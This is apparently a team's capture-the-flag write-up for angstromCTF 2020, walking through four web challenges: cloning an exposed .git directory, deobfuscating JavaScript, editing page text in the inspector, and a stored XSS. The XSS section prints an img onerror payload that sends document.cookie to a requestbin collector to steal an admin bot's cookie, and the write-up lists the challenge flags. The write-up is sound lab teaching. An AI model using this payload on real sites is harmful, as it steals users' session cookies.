# angstromCTF 2020
### This is our writeups for ångstromCTF 2020.
![angstrom-3e0d6c871da7786e59fcc988735f4f5ded75aab5fac89f538291b3ef033801eb](https://user-images.githubusercontent.com/36403473/77215806-d4b45380-6b1e-11ea-8853-b9539e6bc4d0.png)

i participated in ångstromCTF 2020 with my awesome team P1rates as python_4004 & my dude mokey  . This is our writeups about some challenges we solved during the competition.

# Web challenges 
## Git Good
 Noting the name of the challenge, I think the system is based on git mangement system 
 But I have to make sure first , so i will use dirb tool
![dirb](https://user-images.githubusercontent.com/36403473/77215204-85205880-6b1b-11ea-9ca2-a46a3b8c8347.png)

now lets try to download git files 
to do that open your terminal and write 
git clone +the link of the challenge 
##### <code> <b> git clone https://gitgood.2020.chall.actf.co/.git </b> </code> 
![Screenshot from 2020-03-21 02-37-29](https://user-images.githubusercontent.com/36403473/77215565-5f944e80-6b1d-11ea-9f41-b7f8d0feba48.png)
The first thing I thought about was looking at the log file
##### <code> <b>git log -p</b> </code>
![Screenshot from 2020-03-21 02-41-08](https://user-images.githubusercontent.com/36403473/77215657-037dfa00-6b1e-11ea-8edf-e4d6b2588f11.png)
yup i found the flag 
##### actf{b3_car3ful_wh4t_y0u_s3rve_wi7h}
## Consolation

by clicking on <b> pay my some money </b> it call <b> nofret() </b> function so let's see  source code  
![Screenshot from 2020-03-21 03-36-56](https://user-images.githubusercontent.com/36403473/77216945-2f51ad80-6b27-11ea-8634-b35ee7b33fe3.png)

okey i found that javascript is obfuscated.
so we need to revesre this code ,i use this online platform to decode our obfuscated js file <b> http://www.jsnice.org/ </b>

![Screenshot from 2020-03-21 03-46-10](https://user-images.githubusercontent.com/36403473/77216996-86578280-6b27-11ea-808b-fe5a8a3fb972.png)

looking very well i found ohh lets delete this line and put thit function on console <b>console ["clear"] ();</b>

![Screenshot from 2020-03-21 04-02-07](https://user-images.githubusercontent.com/36403473/77217187-2feb4380-6b29-11ea-9442-0a00b9398630.png)

yup i found it 
<b> actf{you_would_n0t_beli3ve_your_eyes} <b/>

##The Magic Word

it was very easy challenge what you should do only open <b>inspect</b>  and Change <b> "give flag" </b> to <b> "please give flag" </b>
![Screenshot from 2020-03-21 04-07-53](https://user-images.githubusercontent.com/36403473/77217291-fff07000-6b29-11ea-8a41-ac63fdd4ef62.png)
our flag is <b> actf{1nsp3c7_3l3m3nt_is_y0ur_b3st_fri3nd} </b>

## Xmas Still Stands

This was an easy <b> xss stored </b>  challenge given the following:
 
first i post this post <img src=x onerror='requestbin?cookie='+document.cookie>
i use requestbin to get admin cookies 
![Screenshot from 2020-03-21 04-26-16](https://user-images.githubusercontent.com/36403473/77217832-1e586a80-6b2e-11ea-9c2c-020f7d1e9376.png)

i reported my post to admin , checking my requestbin i found the flag 

![9d2b4cb0-d98d-4053-a165-341fc82d376d](https://user-images.githubusercontent.com/36403473/77217880-9faffd00-6b2e-11ea-8e50-b45a691fbb00.jpeg)

yup the flag is <b> actf{s4n1tize_y0ur_html_4nd_y0ur_h4nds} </b>
